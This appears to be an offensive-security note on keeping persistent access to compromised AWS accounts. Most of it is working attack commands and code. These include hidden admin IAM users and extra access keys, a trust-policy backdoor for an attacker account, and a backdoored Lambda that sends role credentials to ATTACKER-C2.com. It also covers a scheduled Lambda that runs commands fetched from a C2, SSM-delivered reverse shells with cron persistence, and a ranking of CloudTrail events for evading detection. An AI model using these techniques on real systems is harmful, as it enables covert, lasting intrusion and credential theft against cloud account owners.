# 09.1 — AWS Persistence Techniques

## What This Note Covers

How attackers maintain access to AWS environments after initial compromise — IAM backdoors, Lambda persistence, EC2 userdata modification, secondary access keys, SSM agent abuse, and CloudTrail-aware persistence.

---

## The Persistence Challenge in Cloud

Cloud environments make traditional persistence (cron jobs, init scripts, rootkits) unreliable because:
- EC2 instances are ephemeral — they can be replaced any time
- Functions are stateless — they have no persistent runtime
- Credentials expire — temporary credentials last 1-12 hours

Cloud-native persistence therefore targets the **IAM layer** — the only thing that persists regardless of compute changes. If you own an IAM identity with permanent credentials, you maintain access even if the entire application is redeployed.

---

## Technique 1: Backdoor IAM User (Primary Persistence)

Creating a new IAM user with an access key is the most reliable AWS persistence mechanism. Unlike role credentials, access keys don't expire.

```bash
# Requires: iam:CreateUser, iam:CreateAccessKey, iam:AttachUserPolicy

# Step 1: Create a low-profile user (blend with existing naming conventions)
aws iam create-user --user-name svc-monitoring-01

# Step 2: Attach admin policy
aws iam attach-user-policy \
  --user-name svc-monitoring-01 \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Step 3: Create access key (the persistent credential)
aws iam create-access-key --user-name svc-monitoring-01

# Returns:
{
  "AccessKey": {
    "UserName": "svc-monitoring-01",
    "AccessKeyId": "AKIA...",
    "SecretAccessKey": "...",
    "Status": "Active"
  }
}

# Step 4: Exfiltrate the key pair to attacker infrastructure
# Store offline — this survives environment rebuilds

# Step 5: Add a tag that blends in
aws iam tag-user \
  --user-name svc-monitoring-01 \
  --tags Key=Purpose,Value="CloudWatch monitoring service account" \
         Key=CreatedBy,Value="infrastructure-team" \
         Key=CreatedDate,Value="$(date +%Y-%m-%d)"
```

> [!warning] This is the most detected persistence technique
> AWS CloudTrail logs CreateUser and CreateAccessKey. Any mature SOC with an alert on these events will catch this immediately. Use it only when necessary and blend the naming with existing patterns.

## Technique 2: Secondary Access Key (Stealthy)

Instead of creating a new user, create a second access key for an existing user. Less obvious than a new user, but still logged.

```bash
# Requires: iam:CreateAccessKey (on the target user)

# Create a second key for a high-privilege existing user
aws iam create-access-key --user-name existing-admin-user

# The user now has 2 keys — the original + your backdoor
# If the original user doesn't notice, both remain active

# List existing keys to understand current state
aws iam list-access-keys --user-name existing-admin-user
```

## Technique 3: Modify Role Trust Policy (Cross-Account Backdoor)

Adding an external account as a trusted principal in a role's trust policy gives the attacker persistent access via cross-account role assumption — harder to spot than a new IAM user.

```bash
# Requires: iam:UpdateAssumeRolePolicy

# Get current trust policy
aws iam get-role --role-name TARGET_ROLE \
  --query 'Role.AssumeRolePolicyDocument' > trust-policy.json

# Add attacker's account as trusted principal
# Edit trust-policy.json to add:
# {
#   "Effect": "Allow",
#   "Principal": {"AWS": "arn:aws:iam::ATTACKER_ACCOUNT:root"},
#   "Action": "sts:AssumeRole"
# }

# Apply modified trust policy
aws iam update-assume-role-policy \
  --role-name TARGET_ROLE \
  --policy-document file://trust-policy.json

# From attacker's account — assume the role at any time
aws sts assume-role \
  --role-arn arn:aws:iam::VICTIM_ACCOUNT:role/TARGET_ROLE \
  --role-session-name maintenance-session \
  --profile attacker-account
```

## Technique 4: Lambda Persistence (Code Modification)

Modify an existing Lambda function to include a backdoor trigger — every time the legitimate function runs, it also performs attacker-defined actions.

```python
# Backdoored Lambda handler
import boto3
import os
import urllib.request

def handler(event, context):
    # Original legitimate function code here...
    result = original_business_logic(event)
    
    # Backdoor: exfiltrate execution role credentials on every invocation
    sts = boto3.client('sts')
    identity = sts.get_caller_identity()
    
    # Get current temp credentials from execution context
    creds_url = "http://169.254.170.2" + os.environ.get('AWS_CONTAINER_CREDENTIALS_RELATIVE_URI', '')
    try:
        creds = urllib.request.urlopen(creds_url, timeout=2).read().decode()
        # Exfil creds to attacker C2
        urllib.request.urlopen(
            urllib.request.Request(
                "https://ATTACKER-C2.com/receive",
                data=creds.encode(),
                method='POST'
            ), timeout=2
        )
    except:
        pass  # Silent failure — don't break the legitimate function
    
    return result
```

```bash
# Deploy the backdoored function
zip backdoored.zip backdoored_handler.py
aws lambda update-function-code \
  --function-name LEGITIMATE_FUNCTION \
  --zip-file fileb://backdoored.zip

# Now every legitimate invocation exfiltrates fresh credentials
```

## Technique 5: Lambda Scheduled Event (Active C2)

Create a new Lambda function that runs on a schedule to beacon back to attacker infrastructure.

```bash
# Requires: lambda:CreateFunction, events:PutRule, events:PutTargets, iam:PassRole

# Step 1: Create the beacon function
cat > beacon.py << 'EOF'
import urllib.request
import json
import boto3
import subprocess

def handler(event, context):
    # Execute commands from C2
    try:
        cmd_response = urllib.request.urlopen("https://ATTACKER-C2.com/cmd", timeout=5)
        cmd = cmd_response.read().decode().strip()
        if cmd:
            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            urllib.request.urlopen(
                urllib.request.Request("https://ATTACKER-C2.com/result",
                    data=result, method='POST'), timeout=5
            )
    except:
        pass
EOF
zip beacon.zip beacon.py

# Step 2: Create function with existing execution role
aws lambda create-function \
  --function-name aws-health-check-daemon \
  --runtime python3.11 \
  --role arn:aws:iam::ACCOUNT:role/ExistingLambdaRole \
  --handler beacon.handler \
  --zip-file fileb://beacon.zip

# Step 3: Create EventBridge rule to run every 5 minutes
aws events put-rule \
  --name "aws-health-check" \
  --schedule-expression "rate(5 minutes)" \
  --state ENABLED

# Step 4: Target the Lambda function
aws events put-targets \
  --rule "aws-health-check" \
  --targets "Id=health-check-target,Arn=arn:aws:lambda:REGION:ACCOUNT:function:aws-health-check-daemon"
```

## Technique 6: SSM Agent Abuse

AWS Systems Manager Run Command can execute commands on any EC2 instance with the SSM agent — without SSH, without security group changes.

```bash
# Requires: ssm:SendCommand

# Execute a reverse shell via SSM (persists through instance restarts if added to userdata)
aws ssm send-command \
  --instance-ids i-TARGET_INSTANCE \
  --document-name AWS-RunShellScript \
  --parameters 'commands=[
    "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &",
    "crontab -l | { cat; echo \"* * * * * bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"; } | crontab -"
  ]'

# Or persist via EC2 userdata modification (requires ec2:ModifyInstanceAttribute)
# Note: userdata changes take effect on restart
```

## Technique 7: Secrets Manager Backdoor

Store attacker credentials in Secrets Manager under a plausible name — retrieve them later via the API.

```bash
# Requires: secretsmanager:CreateSecret

aws secretsmanager create-secret \
  --name "prod/monitoring/api-credentials" \
  --description "CloudWatch monitoring service API credentials" \
  --secret-string '{"access_key_id":"ATTACKER_KEY","secret_access_key":"ATTACKER_SECRET"}'

# Retrieve later (from any identity with secretsmanager:GetSecretValue)
aws secretsmanager get-secret-value \
  --secret-id "prod/monitoring/api-credentials" \
  --query SecretString --output text
```

## Detection Evasion for IAM Persistence

Operators with CloudTrail alerts should be aware of what events trigger alerts:

```
HIGH ALERT probability:
  iam:CreateUser             → most SOCs alert on this
  iam:CreateAccessKey        → alerts on this too
  iam:AttachUserPolicy       → especially for AdministratorAccess

LOWER ALERT probability:
  iam:UpdateAssumeRolePolicy → less commonly alerted
  iam:CreatePolicyVersion    → often missed
  lambda:UpdateFunctionCode  → often missed
  events:PutRule             → rarely alerted

MINIMAL ALERT probability:
  iam:TagUser                → almost never alerted
  secretsmanager:CreateSecret → often missed
```
